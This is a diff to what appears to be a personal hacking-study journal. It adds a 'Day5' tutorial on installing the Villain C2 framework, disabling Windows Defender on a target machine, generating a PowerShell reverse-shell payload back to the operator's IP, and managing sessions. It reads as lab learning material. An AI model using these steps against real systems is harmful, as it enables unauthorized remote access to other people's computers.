@@ -34,3 +34,40 @@ I'm excited to learn more new things ahead!
         Port forwarding is a networking technique that redirects traffic from an external IP and port to an internal device         on a private network.
          It is useful for remote access to services.
          However, it can be risky if misconfigured, as it may expose internal services to attackers.
+# Day5
+Creating Reverse shell for Windows Hacking using Villain FrameWork:
+-->Villain is a C2 (Command & Control) framework for managing reverse shells and backdoors across multiple machines.
+**1. Install Villain**
+
+```bash
+git clone https://github.com/t3l3machus/Villain.git
+cd Villain
+sudo apt update
+sudo apt install python3 python3-pip
+pip3 install -r requirements.txt
+```
+
+**2. Launch Villain**
+
+```bash
+cd Villain
+sudo python3 Villain.py
+```
+
+**3. On Victim Windows Machine**
+
+* Turn off **Windows Defender** → Real-time protection **OFF**.
+
+**4. Generate & Execute Payload**
+
+* In Villain:
+
+  ```bash
+  generate payload=windows/reverse_tcp/powershell lhost=<Your_IP> lport=4444
+  ```
+* Copy payload → Paste into **Windows PowerShell** → Press **Enter**.
+
+**5. Manage Sessions**
+
+* `sessions` → View active sessions.
+* `shell <ID>` → Interact with a session.
